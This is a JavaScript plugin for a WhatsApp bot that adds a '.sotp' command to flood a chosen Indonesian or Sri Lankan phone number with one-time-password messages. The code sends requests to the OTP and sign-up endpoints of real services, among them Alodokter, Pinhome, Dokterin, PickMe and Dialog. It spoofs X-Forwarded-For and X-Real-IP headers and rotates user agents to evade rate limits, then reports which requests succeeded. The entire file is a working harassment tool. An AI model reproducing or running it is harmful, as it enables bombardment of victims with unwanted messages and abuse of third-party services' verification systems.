/*
  Created by ⁉️
  t.me/yat1mlau · t.me/abourvin7x · t.me/vinzxcmmnty
  * Rules ‼️ don't delete credit, don't remake + delete credit
  # RespectCreator
*/

const { cmd } = require('../command');
const axios = require('axios');
const crypto = require('crypto');

console.log('🔄 Loading spamotp (fixed) plugin...');

cmd({
    pattern: "sotp",
    desc: "Spam OTP using verified endpoints (global + 62 + 94) – actual OTP delivery",
    category: "tools",
    filename: __filename
},
async (conn, mek, m, { from, reply, args }) => {
    // Immediately reply to confirm command is triggered
    await reply('✅ *spamotp command triggered!* Processing...');

    try {
        let targetInput = (args || []).join(' ').trim();
        if (!targetInput && m.quoted) {
            targetInput = (m.quoted.text || m.quoted.caption || "").trim();
        }
        if (!targetInput) {
            return reply(`— ex: .sotp 08xxxxxxxxxx (Indonesia)\n— ex: .spamotp50 0712345678 (Sri Lanka)`);
        }

        await conn.sendMessage(from, { react: { text: '⏳', key: m.key } });
        reply(`🚀 *Starting OTP spam to:* ${targetInput}\n_This may take a few minutes._`);

        // ----- Country detection ------
        let raw = targetInput.replace(/[^0-9]/g, '');
        let countryCode = '62'; // default
        const slPrefixes = ['071','072','073','074','075','076','077','078','079'];
        if (raw.startsWith('0') && raw.length >= 10 && raw.length <= 11) {
            if (slPrefixes.some(pre => raw.startsWith(pre))) {
                countryCode = '94';
                raw = raw.slice(1);
            } else {
                countryCode = '62';
                raw = raw.slice(1);
            }
        } else if (raw.startsWith('62')) {
            countryCode = '62';
            raw = raw.slice(2);
        } else if (raw.startsWith('94')) {
            countryCode = '94';
            raw = raw.slice(2);
        }

        const full = countryCode + raw;
        const pInt = full;                // e.g., 628123456789
        const pLocal = raw;               // without country
        const p0 = "0" + raw;             // with leading zero

        // ----- CONFIG -----
        const CONFIG = { retries: 1, timeout: 20000, delayMin: 2000, delayMax: 3000 };
        const USER_AGENTS = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1'
        ];
        const IP_POOL = Array.from({ length: 200 }, () =>
            `${crypto.randomInt(1,255)}.${crypto.randomInt(1,255)}.${crypto.randomInt(1,255)}.${crypto.randomInt(1,255)}`
        );
        const randomIP = () => IP_POOL[crypto.randomInt(0, IP_POOL.length)];
        const randomUA = () => USER_AGENTS[crypto.randomInt(0, USER_AGENTS.length)];
        const randomDelay = (min = CONFIG.delayMin, max = CONFIG.delayMax) =>
            new Promise(resolve => setTimeout(resolve, crypto.randomInt(min, max)));

        // ----- TRUSTED OTP ENDPOINTS (actual OTP senders) -----
        const endpoints = [
            // 1. Microsoft (works globally)
            {
                name: 'Microsoft',
                url: 'https://login.microsoftonline.com/common/GetCredentialType',
                data: { username: pInt, isOtherIdpSupported: true, checkPhones: false },
                check: (data) => data && data.IfExistsResult === 0
            },
            // 2. GitHub (works globally)
            {
                name: 'GitHub',
                url: 'https://github.com/sessions/sign_up',
                data: { user: { login: `user${crypto.randomInt(1000,9999)}`, email: `${crypto.randomUUID()}@mail.com`, password: 'Password123!' } },
                check: (data) => data && data.status === 'success'
            },
            // 3. Alodokter (Indonesia)
            {
                name: 'Alodokter',
                url: 'https://www.alodokter.com/resend-otp',
                data: { user: { phone: p0, uuid: crypto.randomUUID() }, request_via: 'whatsapp' },
                headers: { 'Content-Type': 'application/json' },
                check: (data) => data && data.status === 'success'
            },
            // 4. Pinhome (Indonesia) – needs CSRF
            {
                name: 'Pinhome',
                url: 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
                data: { accountType: 'customers', applicationType: 'Pinhome Web', countryCode: '62', medium: 'whatsapp', otpType: 'register', phoneNumber: raw },
                headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
                check: (data) => data && data.status === 'success'
            },
            // 5. Dokterin (Indonesia)
            {
                name: 'Dokterin',
                url: 'https://api.dokterin.id/user/v1/users/login',
                data: { phone: pInt, tnc_accept: true, device_id: crypto.randomUUID() },
                headers: { 'Origin': 'https://dokterin.id', 'Referer': 'https://dokterin.id/login' },
                check: (data) => data && data.status === 'success'
            },
            // 6. PickMe (Sri Lanka)
            {
                name: 'PickMe',
                url: 'https://api.pickme.lk/v1/auth/otp',
                data: { phone: pInt },
                check: (data) => data && data.status === 'success'
            },
            // 7. Dialog (Sri Lanka)
            {
                name: 'Dialog',
                url: 'https://www.dialog.lk/api/otp',
                data: { phone: pInt, email: `${crypto.randomUUID()}@mail.com` },
                check: (data) => data && data.status === 'success'
            }
        ];

        // ----- Send request with detailed logging -----
        const results = [];
        const startTime = Date.now();

        for (let i = 0; i < endpoints.length; i++) {
            const ep = endpoints[i];
            const headers = {
                'User-Agent': randomUA(),
                'X-Forwarded-For': randomIP(),
                'X-Real-IP': randomIP(),
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                ...(ep.headers || {})
            };
            // Override Content-Type if not set
            if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';

            let responseText = '';
            let success = false;
            let statusCode = 0;
            let errorMsg = '';

            try {
                const resp = await axios.post(ep.url, ep.data, { headers, timeout: CONFIG.timeout });
                statusCode = resp.status;
                responseText = JSON.stringify(resp.data).slice(0, 200);
                // Check custom condition or status 200-204
                if (ep.check) {
                    success = ep.check(resp.data);
                } else {
                    success = resp.status >= 200 && resp.status < 300;
                }
            } catch (err) {
                statusCode = err.response?.status || 0;
                errorMsg = err.message;
                responseText = err.response?.data ? JSON.stringify(err.response.data).slice(0, 200) : '';
                success = false;
            }

            results.push({
                name: ep.name,
                status: statusCode,
                success: success,
                response: responseText,
                error: errorMsg
            });

            if (i < endpoints.length - 1) await randomDelay();
        }

        // ----- Generate report -----
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        const successCount = results.filter(r => r.success).length;
        const failedCount = results.filter(r => !r.success).length;

        let report = `📊 *OTP SPAM (VERIFIED)*\n\n` +
                     `🎯 *Target:* ${full}\n` +
                     `📡 *Total:* ${endpoints.length}\n` +
                     `✅ *Success:* ${successCount}/${endpoints.length}\n` +
                     `❌ *Failed:* ${failedCount}/${endpoints.length}\n` +
                     `⏱️ *Time:* ${elapsed}s\n\n` +
                     `*Details:*\n`;

        results.forEach(r => {
            report += `${r.success ? '✅' : '❌'} *${r.name}* (${r.status}) – ${r.success ? 'OTP sent' : 'failed'}\n`;
            if (r.response) report += `   ↳ ${r.response}\n`;
        });

        await conn.sendMessage(from, { text: report }, { quoted: m });
        await conn.sendMessage(from, { react: { text: successCount > 0 ? '✅' : '❌', key: m.key } });

    } catch (err) {
        console.error("OTP 50 Error:", err);
        await conn.sendMessage(from, { react: { text: '❌', key: m.key } });
        reply(`❌ Error: ${err.message || err}`);
    }
});

console.log('✅ spamotp50 (fixed) plugin loaded.');
